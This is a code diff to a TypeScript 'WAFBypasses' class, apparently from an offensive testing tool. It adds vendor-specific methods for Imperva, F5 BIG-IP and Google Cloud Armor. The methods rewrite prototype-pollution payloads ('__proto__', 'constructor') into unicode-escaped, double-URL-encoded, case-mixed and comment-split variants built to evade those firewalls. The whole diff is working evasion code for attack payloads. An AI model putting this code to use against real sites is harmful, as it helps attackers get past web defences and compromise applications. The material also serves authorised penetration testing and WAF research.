@@ -382,11 +382,20 @@ export class WAFBypasses {
 		if (/__proto__/i.test(payload)) {
 			const protoEncoded = payload.replace(/__proto__/gi, '%255f%255fproto%255f%255f');
 			bypasses.push(protoEncoded);
+		}
+		if (/\[/.test(payload)) {
 			bypasses.push(payload.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
-			bypasses.push(protoEncoded.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
+			if (/__proto__/i.test(payload)) {
+				const protoEncoded = payload.replace(/__proto__/gi, '%255f%255fproto%255f%255f');
+				bypasses.push(protoEncoded.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
+			}
 		}
 		if (/constructor/i.test(payload)) {
-			bypasses.push(payload.replace(/constructor/gi, '%2563onstructor'));
+			const constructorEncoded = payload.replace(/constructor/gi, '%2563onstructor');
+			bypasses.push(constructorEncoded);
+			if (/\[/.test(payload)) {
+				bypasses.push(constructorEncoded.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
+			}
 		}
 
 		return [...new Set(bypasses)];
@@ -453,6 +462,53 @@ export class WAFBypasses {
 		// Add null byte (sometimes bypasses filters)
 		bypasses.push(payload + '%00');
 
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * Imperva specific bypasses
+	 */
+	static impervaBypass(payload: string): string[] {
+		const bypasses = [payload];
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__pr\\u006f\\u0074o__'));
+			bypasses.push(payload.replace(/__proto__/gi, '%5f%5fproto%5f%5f'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'const\\u0072uctor'));
+		}
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * F5 BIG-IP specific bypasses
+	 */
+	static f5BigIpBypass(payload: string): string[] {
+		const bypasses = [payload];
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__PrOtO__'));
+			bypasses.push(payload.replace(/__proto__/gi, '__pr/**/oto__'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'CoNsTrUcToR'));
+			bypasses.push(payload.replace(/constructor/gi, 'const/**/ructor'));
+		}
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * Google Cloud Armor specific bypasses
+	 */
+	static googleCloudArmorBypass(payload: string): string[] {
+		const bypasses = [payload];
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__pr\\u006f\\u0074o__'));
+			bypasses.push(payload.replace(/__proto__/gi, '%255f%255fproto%255f%255f'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'const\\u0072uctor'));
+			bypasses.push(payload.replace(/constructor/gi, '%2563onstructor'));
+		}
 		return [...new Set(bypasses)];
 	}
 
